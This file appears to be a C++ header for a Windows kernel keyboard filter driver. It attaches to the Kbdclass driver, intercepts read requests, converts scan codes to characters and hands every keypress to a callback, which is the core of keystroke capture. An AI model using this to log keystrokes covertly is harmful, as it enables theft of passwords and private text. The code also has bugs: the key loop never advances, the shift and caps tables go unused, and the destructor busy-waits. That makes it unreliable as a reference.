#pragma once
#include <stdafx.h>
#include "AttachFilter.h"
namespace ddk {
	namespace flt {
		class KeyBoardFilter
		{
		private:
			using pfnCallback = std::function<VOID(CHAR ch)>;
			const WCHAR *m_drvName = L"\\Driver\\Kbdclass";
			const UCHAR S_SHIFT = 1;
			const UCHAR S_CAPS = 2;
			const UCHAR S_NUM = 4;
			unsigned char asciiTbl[336] = {
				0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09,	//normal
				0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x0D, 0x00, 0x61, 0x73,
				0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x7A, 0x78, 0x63, 0x76,
				0x62, 0x6E, 0x6D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
				0x32, 0x33, 0x30, 0x2E,
				0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09,	//caps
				0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x5B, 0x5D, 0x0D, 0x00, 0x41, 0x53,
				0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x5A, 0x58, 0x43, 0x56,
				0x42, 0x4E, 0x4D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
				0x32, 0x33, 0x30, 0x2E,
				0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09,	//shift
				0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x7B, 0x7D, 0x0D, 0x00, 0x41, 0x53,
				0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x5A, 0x58, 0x43, 0x56,
				0x42, 0x4E, 0x4D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
				0x32, 0x33, 0x30, 0x2E,
				0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09,	//caps + shift
				0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x7B, 0x7D, 0x0D, 0x00, 0x61, 0x73,
				0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x7A, 0x78, 0x63, 0x76,
				0x62, 0x6E, 0x6D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
				0x32, 0x33, 0x30, 0x2E
			};
		private://成员变量
			AttachFilter m_flt;
			ULONG m_KeyCount;
			int m_kbStatus;
			pfnCallback m_callback;
		private://隐藏单例的方法
			KeyBoardFilter() {
				m_KeyCount = 0;
				m_kbStatus = S_NUM;
				m_callback = NULL;
				m_flt.attachDriver((WCHAR *)m_drvName);
				m_flt.regDispatch(IRP_MJ_READ, kbdOnRead);
			}
			KeyBoardFilter(KeyBoardFilter &) = delete;
			KeyBoardFilter& operator = (KeyBoardFilter) = delete;
		public://公开方法
			~KeyBoardFilter() {
				while (m_KeyCount);
				m_callback = NULL;
			}
			static KeyBoardFilter &getIntanceRef() {
				static KeyBoardFilter self;
				return self;
			}
			static KeyBoardFilter *getInstancePtr() {
				return &getIntanceRef();
			}
			void regCallback(pfnCallback callback) {
				m_callback = callback;
			}
		private:
			static NTSTATUS kbdOnRead(PDEVICE_OBJECT devObj, PIRP Irp) {
				NTSTATUS status = STATUS_UNSUCCESSFUL;
				PIO_STACK_LOCATION irpStack;
				auto devExt = reinterpret_cast<AttachFilter::PDEVICE_EXTENSION>(devObj->DeviceExtension);

				if (Irp->CurrentLocation == 1)
				{
					status = STATUS_INVALID_DEVICE_REQUEST;
					Irp->IoStatus.Status = status;
					Irp->IoStatus.Information = 0;
					IoCompleteRequest(Irp, IO_NO_INCREMENT);
					return status;
				}
				getIntanceRef().m_KeyCount++;
				irpStack = IoGetCurrentIrpStackLocation(Irp);
				IoCopyCurrentIrpStackLocationToNext(Irp);
				IoSetCompletionRoutine(Irp, kdbReadComplete, devObj, TRUE, TRUE, TRUE);
				return IoCallDriver(devExt->attachedDev, Irp);
			}
			static NTSTATUS kdbReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
			{
				if (NT_SUCCESS(Irp->IoStatus.Status))
				{
					auto buf = (CHAR *)Irp->AssociatedIrp.SystemBuffer;
					auto len = Irp->IoStatus.Information;
					auto keyData = reinterpret_cast<PKEYBOARD_INPUT_DATA>(buf);
					auto numKeys = len / sizeof(KEYBOARD_INPUT_DATA);
					for (auto i = 0UL; i < numKeys; ++i)
					{
						if (keyData->Flags == KEY_MAKE) //按下
						{
							char ch = getInstancePtr()->getChar(keyData->MakeCode);
							if (ch)
							{
								if (getInstancePtr()->m_callback != NULL)
									getInstancePtr()->m_callback(ch);
							}
						}

						if (keyData->Flags == KEY_BREAK)//抬起
						{

						}
					}
				}
				getIntanceRef().m_KeyCount--;
				if (Irp->PendingReturned)
				{
					IoMarkIrpPending(Irp);
				}
				return Irp->IoStatus.Status;
			}
			char getChar(USHORT sch)
			{
				UCHAR	ch = 0;
				int		off = 0;

				if ((sch & 0x80) == 0)	//make
				{
					if ((sch < 0x47) ||
						((sch >= 0x47 && sch < 0x54) && (m_kbStatus & S_NUM))) // Num Lock
					{
						ch = asciiTbl[off + sch];
					}

					switch (sch)
					{
					case 0x3A:
						m_kbStatus ^= S_CAPS;
						break;

					case 0x2A:
					case 0x36:
						m_kbStatus |= S_SHIFT;
						break;

					case 0x45:
						m_kbStatus ^= S_NUM;
					}
				}
				else		//break
				{
					if (sch == 0xAA || sch == 0xB6)
						m_kbStatus &= ~S_SHIFT;
				}
				return ch;
			}
		};
	}
}